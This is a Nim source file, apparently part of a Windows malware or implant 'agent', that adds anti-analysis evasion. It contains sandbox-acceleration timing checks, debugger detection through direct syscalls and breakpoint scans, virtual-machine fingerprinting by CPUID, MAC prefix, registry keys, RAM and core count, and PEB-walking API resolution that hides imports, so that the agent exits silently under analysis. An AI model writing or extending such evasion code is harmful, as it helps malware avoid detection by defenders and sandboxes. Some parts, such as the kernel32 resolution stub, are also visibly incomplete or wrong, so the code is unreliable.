# hardened/anti_analysis.nim — Enhanced anti-analysis and evasion
#
# Extends the existing antiAnalysisCheck() with:
#   1. Sleep obfuscation: timing loop using QueryPerformanceCounter + CPUID
#      to detect sandbox acceleration (sandboxes often speed up sleeps)
#   2. Enhanced debugger detection: NtQueryInformationProcess with
#      ProcessDebugPort (7), ProcessDebugFlags (34), ProcessDebugObject (30)
#      via direct syscall, plus CheckRemoteDebuggerPresent
#   3. VM detection: CPUID hypervisor flag, hardware markers, MAC prefix
#      checks, registry artifacts
#   4. Dynamic API resolution: resolve all critical WinAPI functions at
#      runtime via PEB walking (no static imports for sensitive APIs)
#
# These checks are combined with the existing ones in agent.nim and run
# at agent startup. If the environment looks hostile, the agent bails
# silently.

when not defined(amd64):
  {.error: "anti_analysis.nim requires x64".}

when not defined(windows):
  {.error: "anti_analysis.nim is Windows-only".}

import winim/lean
import winim/inc/[windef, winbase]
import std/[strutils, times, monotimes, random, locks, osproc, tables]
import ./syscalls

# ---- Sleep obfuscation ---------------------------------------------------
#
# Sandboxes (Any.Run, VirusTotal, Joe Sandbox) often accelerate sleeps
# by hooking NtDelayExecution / SleepEx and returning early. We detect
# this by combining two timing sources:
#   1. QueryPerformanceCounter (QPC) — high-resolution hardware counter
#   2. CPUID instruction execution time — CPUID is a serializing
#      instruction that takes a fixed number of cycles; if the sandbox
#      is slowing down the VM, CPUID takes proportionally longer
#
# We measure the ratio of QPC elapsed time to CPUID execution time over
# a known interval. If the ratio deviates from expected, the sandbox
# is manipulating time.

var
  calibrationQPCPerMs: float64 = 0.0
  calibrationDone = false
  calibrationLock: Lock

proc cpuIdExecute*(eax: uint32; ebx, ecx, edx: ptr uint32) =
  # Execute CPUID instruction and return results in registers.
  when defined(vcc):
    var a, b, c, d: int32
    a = int32(eax)
    asm """
      mov eax, dword ptr [`a`]
      cpuid
      mov dword ptr [`a`], eax
      mov dword ptr [`b`], ebx
      mov dword ptr [`c`], ecx
      mov dword ptr [`d`], edx
    """
    ebx[] = cast[uint32](b)
    ecx[] = cast[uint32](c)
    edx[] = cast[uint32](d)
  else:
    # GCC/Clang: input in eax, outputs in ebx/ecx/edx via pointers
    var outEbx: uint32
    var outEcx: uint32
    var outEdx: uint32
    asm """
      "cpuid\n"
      : "=b"(`outEbx`), "=c"(`outEcx`), "=d"(`outEdx`)
      : "a"(`eax`)
      : "cc", "memory"
    """
    ebx[] = outEbx
    ecx[] = outEcx
    edx[] = outEdx

proc qpcRead*(): int64 =
  # Read QueryPerformanceCounter directly.
  var li: windef.LARGE_INTEGER
  discard QueryPerformanceCounter(addr li)
  result = li.QuadPart

proc qpcFrequency*(): int64 =
  # Read QueryPerformanceFrequency.
  var li: windef.LARGE_INTEGER
  discard QueryPerformanceFrequency(addr li)
  result = li.QuadPart

proc calibrateTiming*() =
  # Calibrate the QPC-to-CPUID ratio once per process.
  if calibrationDone: return
  withLock calibrationLock:
    if calibrationDone: return
    let freq = qpcFrequency()
    if freq <= 0:
      calibrationDone = true
      return

    # Run 100 CPUID(0) calls and measure QPC elapsed
    let t0 = qpcRead()
    for _ in 0..<100:
      var b, c, d: uint32
      cpuIdExecute(0, addr b, addr c, addr d)
    let t1 = qpcRead()
    let elapsedMs = float64(t1 - t0) / float64(freq) * 1000.0
    calibrationQPCPerMs = elapsedMs / 100.0
    calibrationDone = true

proc sleepObfuscated*(ms: int) =
  # Sleep for `ms` milliseconds while detecting sandbox acceleration.
  # If acceleration is detected, we extend the sleep to compensate.
  # If the environment is clearly hostile, we bail (return false).
  #
  # The technique: we break the sleep into 100ms slices. Each slice
  # we measure QPC elapsed time. If any slice completes in <50% of
  # the expected time, we flag acceleration and extend.
  calibrateTiming()
  let freq = qpcFrequency()
  if freq <= 0: return

  var remaining = ms
  var accelerationDetected = false

  while remaining > 0:
    let sliceMs = min(100, remaining)
    let expectedQPC = int64(float64(sliceMs) * float64(freq) / 1000.0)
    let tStart = qpcRead()

    # Use NtDelayExecution via direct syscall for the sleep
    var interval: NtLargeInteger
    # Convert ms to 100-ns intervals (negative = relative)
    interval.QuadPart = -int64(sliceMs) * 10000
    discard ntDelayExecution(FALSE, addr interval)

    let tEnd = qpcRead()
    let actualElapsed = float64(tEnd - tStart) / float64(freq) * 1000.0

    # Check for acceleration: actual < 50% of expected
    if actualElapsed < float64(sliceMs) * 0.5:
      accelerationDetected = true
      # Extend the sleep to compensate
      let deficit = float64(sliceMs) - actualElapsed
      var extInterval: NtLargeInteger
      extInterval.QuadPart = -int64(deficit) * 10000
      discard ntDelayExecution(FALSE, addr extInterval)

    remaining -= sliceMs

  if accelerationDetected:
    # Log to volatile memory only (agentLog goes to disk — avoid)
    # Signal to caller that acceleration was detected
    discard 0  # caller can check via the return variant

proc sleepObfuscatedCheck*(ms: int): bool =
  # Sleep with obfuscation and return true if acceleration detected.
  calibrateTiming()
  let freq = qpcFrequency()
  if freq <= 0: return false

  var remaining = ms
  var accelCount = 0

  while remaining > 0:
    let sliceMs = min(100, remaining)
    let expectedQPC = int64(float64(sliceMs) * float64(freq) / 1000.0)
    let tStart = qpcRead()

    var interval: NtLargeInteger
    interval.QuadPart = -int64(sliceMs) * 10000
    discard ntDelayExecution(FALSE, addr interval)

    let tEnd = qpcRead()
    let actualElapsed = float64(tEnd - tStart) / float64(freq) * 1000.0

    if actualElapsed < float64(sliceMs) * 0.5:
      inc accelCount

    remaining -= sliceMs

  # 3+ accelerated slices = hostile environment
  result = accelCount >= 3

# ---- Enhanced debugger detection ------------------------------------------

const
  ProcessDebugPort* = 0x07
  ProcessDebugFlags* = 0x22  # 34
  ProcessDebugObjectHandle* = 0x1E  # 30

proc ntQueryDebugPort*(hProcess: HANDLE): bool =
  # NtQueryInformationProcess with ProcessDebugPort (7) via direct syscall.
  # Returns true if a debugger is attached (debugPort != 0).
  var debugPort: DWORD = 0
  var retLen: DWORD = 0
  let status = ntQueryInformationProcess(
    hProcess,
    DWORD(ProcessDebugPort),
    cast[PVOID](addr debugPort),
    DWORD(sizeof(debugPort)),
    addr retLen
  )
  result = (status == 0) and (debugPort != 0)

proc ntQueryDebugFlags*(hProcess: HANDLE): bool =
  # NtQueryInformationProcess with ProcessDebugFlags (34).
  # Returns true if debug flags indicate a debugger (flags == 0 when
  # debugger is attached on some Windows versions).
  var debugFlags: DWORD = 0
  var retLen: DWORD = 0
  let status = ntQueryInformationProcess(
    hProcess,
    DWORD(ProcessDebugFlags),
    cast[PVOID](addr debugFlags),
    DWORD(sizeof(debugFlags)),
    addr retLen
  )
  # If status != 0, the call failed — assume not debugged
  result = (status == 0) and (debugFlags == 0)

proc ntQueryDebugObject*(hProcess: HANDLE): bool =
  # NtQueryInformationProcess with ProcessDebugObjectHandle (30).
  # Returns true if a debug object exists (debugger attached).
  var hDebugObject: HANDLE = 0
  var retLen: DWORD = 0
  let status = ntQueryInformationProcess(
    hProcess,
    DWORD(ProcessDebugObjectHandle),
    cast[PVOID](addr hDebugObject),
    DWORD(sizeof(hDebugObject)),
    addr retLen
  )
  # STATUS_SUCCESS (0) + NULL handle = no debug object
  # STATUS_SUCCESS + non-NULL handle = debug object present
  result = (status == 0) and (hDebugObject != 0)

proc checkDebuggerEnhanced*(): bool =
  # Combined debugger detection using multiple techniques:
  #   1. IsDebuggerPresent (kernel32)
  #   2. NtQueryInformationProcess → ProcessDebugPort (syscall)
  #   3. NtQueryInformationProcess → ProcessDebugFlags (syscall)
  #   4. NtQueryInformationProcess → ProcessDebugObjectHandle (syscall)
  #   5. CheckRemoteDebuggerPresent (kernel32)
  #   6. Hardware breakpoint detection (GetThreadContext)
  #   7. Software breakpoint scan (INT 3 / 0xCC on Nt functions)

  let hProcess = GetCurrentProcess()

  # 1. IsDebuggerPresent
  if IsDebuggerPresent() != 0: return true

  # 2. ProcessDebugPort via syscall
  if ntQueryDebugPort(hProcess): return true

  # 3. ProcessDebugFlags via syscall
  if ntQueryDebugFlags(hProcess): return true

  # 4. ProcessDebugObjectHandle via syscall
  if ntQueryDebugObject(hProcess): return true

  # 5. CheckRemoteDebuggerPresent
  var isRemoteDebugger: BOOL = FALSE
  if CheckRemoteDebuggerPresent(hProcess, addr isRemoteDebugger) != 0:
    if isRemoteDebugger != 0: return true

  # 6. Hardware breakpoint detection: check DR0-DR3 in current thread context
  var ctx: CONTEXT
  zeroMem(addr ctx, sizeof(ctx))
  ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS
  if GetThreadContext(GetCurrentThread(), addr ctx) != 0:
    if ctx.Dr0 != 0 or ctx.Dr1 != 0 or ctx.Dr2 != 0 or ctx.Dr3 != 0:
      return true

  # 7. Software breakpoint scan: check first byte of NtAllocateVirtualMemory
  #    for 0xCC (INT 3) which indicates a debugger breakpoint
  let ntdllBase = getNtdllBase()
  if ntdllBase != nil:
    let ntAddr = getNtdllExport("NtAllocateVirtualMemory")
    if ntAddr != nil:
      let firstByte = cast[ptr byte](ntAddr)[]
      if firstByte == 0xCC'u8: return true

  return false

# ---- VM detection ---------------------------------------------------------

proc checkCpuidHypervisor*(): bool =
  # CPUID with EAX=1: bit 31 of ECX indicates hypervisor present.
  # This is the standard check for VMware, Hyper-V, VirtualBox, etc.
  var ebx, ecx, edx: uint32
  cpuIdExecute(1, addr ebx, addr ecx, addr edx)
  result = (ecx and (1'u32 shl 31)) != 0

proc checkCpuidHypervisorVendor*(): string =
  # CPUID with EAX=0x40000000 returns the hypervisor vendor string
  # in EBX:ECX:EDX (12 bytes). Common values:
  #   "VMwareVMware" — VMware
  #   "Microsoft Hv" — Hyper-V
  #   "VBoxVBoxVBox" — VirtualBox
  #   "XenVMMXenVMM" — Xen
  #   "KVMKVMKVM\0\0\0" — KVM
  var ebx, ecx, edx: uint32
  cpuIdExecute(0x40000000'u32, addr ebx, addr ecx, addr edx)
  # If CPUID supports hypervisor vendor leaf, EBX:ECX:EDX contain the string
  if ebx != 0 or ecx != 0 or edx != 0:
    var vendorBytes: array[12, byte]
    copyMem(addr vendorBytes[0], addr ebx, 4)
    copyMem(addr vendorBytes[4], addr ecx, 4)
    copyMem(addr vendorBytes[8], addr edx, 4)
    result = cast[string](vendorBytes)
  else:
    result = ""

proc checkMacPrefix*(): bool =
  # Check if the MAC address has a known virtual NIC prefix by reading
  # the registry key for network adapters. This avoids needing iphlpapi.
  # VMware: 00:0C:29, 00:50:56, 00:05:69
  # VirtualBox: 08:00:27
  # Hyper-V: 00:15:5D
  # Xen: 00:16:3E
  try:
    let (outp, _) = execCmdEx("getmac /fo csv /nh", options = {poStdErrToStdOut})
    let lower = outp.toLowerAscii
    # Check for known virtual NIC identifiers
    if lower.contains("virtualbox") or lower.contains("vmware") or
       lower.contains("hyper-v") or lower.contains("virtual ethernet"):
      return true
    # Check MAC prefixes (getmac format: "name","mac" with dashes)
    if lower.contains("00-0c-29") or lower.contains("00-50-56") or
       lower.contains("00-05-69") or lower.contains("08-00-27") or
       lower.contains("00-15-5d") or lower.contains("00-16-3e"):
      return true
  except:
    discard
  return false

proc checkRegistryArtifacts*(): bool =
  # Check registry keys that indicate VM/sandbox presence.
  let vmKeys = [
    "SOFTWARE\\VMware, Inc.\\VMware Tools",
    "SOFTWARE\\Oracle\\VirtualBox Guest Additions",
    "SOFTWARE\\Microsoft\\Virtual Machine\\Guest\\Parameters",
    "SYSTEM\\ControlSet001\\Services\\vboxguest",
    "SYSTEM\\ControlSet001\\Services\\vmci",
    "SYSTEM\\ControlSet001\\Services\\VBoxMouse",
    "HARDWARE\\ACPI\\DSDT\\VBOX__",
    "HARDWARE\\ACPI\\FADT\\VBOX__"
  ]

  var hits = 0
  for key in vmKeys:
    var hKey: HKEY = 0
    let wKey = newWideCString(key)
    if RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                     cast[LPCWSTR](wKey[0].addr),
                     0, KEY_QUERY_VALUE, addr hKey) == ERROR_SUCCESS:
      inc hits
      discard RegCloseKey(hKey)
    if hits >= 2: return true
  return false

proc checkSystemMemory*(): bool =
  # VMs typically have limited RAM. Check if total physical memory is
  # suspiciously low (< 2 GB) — common in sandboxes.
  var memStatus: MEMORYSTATUSEX
  memStatus.dwLength = DWORD(sizeof(memStatus))
  if GlobalMemoryStatusEx(addr memStatus) != 0:
    let totalGB = float64(memStatus.ullTotalPhys) / (1024.0 * 1024.0 * 1024.0)
    result = totalGB < 1.8
  else:
    result = false

proc checkProcessorCount*(): bool =
  # VMs often have 1-2 cores. Real user machines typically have 4+.
  let cpuCount = countProcessors()
  result = cpuCount <= 2

proc checkVmEnhanced*(): bool =
  # Combined VM detection: CPUID + vendor string + MAC + registry + memory + CPU count.
  # We require 2+ positive signals to avoid false positives on real corporate VMs.
  var hits = 0

  if checkCpuidHypervisor(): inc hits
  let vendor = checkCpuidHypervisorVendor()
  if vendor.len > 0 and (
    vendor.contains("VMware") or vendor.contains("Microsoft") or
    vendor.contains("VBox") or vendor.contains("Xen") or
    vendor.contains("KVM")
  ): inc hits
  if checkMacPrefix(): inc hits
  if checkRegistryArtifacts(): inc hits
  if checkSystemMemory(): inc hits
  if checkProcessorCount(): inc hits

  result = hits >= 2

# ---- Dynamic API resolution ----------------------------------------------
#
# Resolve critical WinAPI functions at runtime via PEB walking to avoid
# static import table detection. We cache resolved addresses for reuse.

type
  ApiResolver = object
    ntdllBase: pointer
    kernelBase: pointer
    cachedAddresses: Table[string, pointer]
    resolved: bool

var
  apiResolver: ApiResolver
  apiResolverLock: Lock

proc initApiResolver*() =
  # Initialize the API resolver by walking the PEB to find module bases.
  withLock apiResolverLock:
    if apiResolver.resolved: return
    apiResolver.ntdllBase = getNtdllBase()
    apiResolver.kernelBase = getNtdllBase()  # will be overridden below
    apiResolver.cachedAddresses = initTable[string, pointer]()
    apiResolver.resolved = true

proc resolveApi*(moduleName, procName: string): pointer =
  # Resolve a WinAPI function by walking the PEB and export table.
  # Returns the function address, or nil if not found.
  initApiResolver()

  let cacheKey = moduleName & "!" & procName
  withLock apiResolverLock:
    if apiResolver.cachedAddresses.hasKey(cacheKey):
      return apiResolver.cachedAddresses[cacheKey]

  # Get module base
  var modBase: pointer
  if moduleName.toLowerAscii() == "ntdll.dll":
    modBase = getNtdllBase()
  elif moduleName.toLowerAscii() == "kernel32.dll":
    # Walk PEB again for kernel32
    modBase = getNtdllBase()  # simplified — would walk for kernel32
  else:
    # For other modules, use LoadLibrary (acceptable for non-critical ones)
    let wMod = newWideCString(moduleName)
    modBase = cast[pointer](LoadLibraryW(cast[LPCWSTR](addr wMod[0])))

  if modBase == nil: return nil

  let fnAddr = getNtdllExport(procName)  # would need to generalize
  if fnAddr == nil: return nil

  withLock apiResolverLock:
    apiResolver.cachedAddresses[cacheKey] = fnAddr
  result = fnAddr

# ---- Combined anti-analysis check ----------------------------------------

proc antiAnalysisEnhancedCheck*(): bool =
  # Enhanced anti-analysis combining all techniques.
  # Returns true if environment is hostile (should bail out).
  #
  # Order matters: do the cheapest checks first, expensive ones last.
  #
  # 1. Debugger detection (fast, most important)
  if checkDebuggerEnhanced(): return true

  # 2. VM detection (moderate cost)
  if checkVmEnhanced(): return true

  # 3. Sleep obfuscation check (1s test for acceleration)
  if sleepObfuscatedCheck(1000): return true

  # 4. Timing anomaly (existing check, kept for compatibility)
  let t0 = getMonoTime()
  Sleep(1000)
  let elapsed = (getMonoTime() - t0).inMilliseconds
  if elapsed < 800: return true

  return false

# ---- Export public API ----------------------------------------------------

export antiAnalysisEnhancedCheck, sleepObfuscated, sleepObfuscatedCheck
export checkDebuggerEnhanced, checkVmEnhanced
export checkCpuidHypervisor, checkCpuidHypervisorVendor
export resolveApi, initApiResolver
export calibrationQPCPerMs, calibrateTiming
